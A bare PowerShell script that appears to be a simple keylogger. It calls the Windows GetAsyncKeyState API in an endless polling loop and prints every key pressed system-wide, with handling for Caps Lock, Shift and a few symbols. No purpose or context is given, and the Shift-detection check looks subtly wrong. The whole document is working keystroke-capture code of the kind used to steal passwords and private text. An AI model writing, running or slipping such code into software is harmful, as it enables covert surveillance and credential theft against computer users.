$signature = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
'@

$caps_lock_state = $false;

$API = Add-Type -MemberDefinition $signature -Name 'Keypress' -Namespace API -PassThru

while ($true) {

    $shiftState = $API::GetAsyncKeyState(16)

    foreach ($asciiCode in 0..255) {
        $keyState = $API::GetAsyncKeyState($asciiCode)

        if ($keyState -eq -32767) {

            if($asciiCode -eq 20){$caps_lock_state = !$caps_lock_state;}

            if (!$caps_lock_state){
                if ($asciiCode -ge 65 -and $asciiCode -le 90) {$asciiCode += 32;}
            }

            if ($shiftState -eq -32767 ) {
                if ($asciiCode -eq 49){
                    Write-Output '!'
                }
                elseif($asciiCode -eq 50){
                    Write-Output '@'
                }
                elseif($asciiCode -eq 51){
                    Write-Output '#'
                }
            }else{
                if($asciiCode -eq 190){
                    Write-Output '.';
                }else{
                    Write-Output $asciiCode
                    $keyChar = [char]$asciiCode
                    Write-Output $keyChar
                }
            }

            

        }
    }

    # Pause for a brief period to avoid excessive polling
    Start-Sleep -Milliseconds 40
}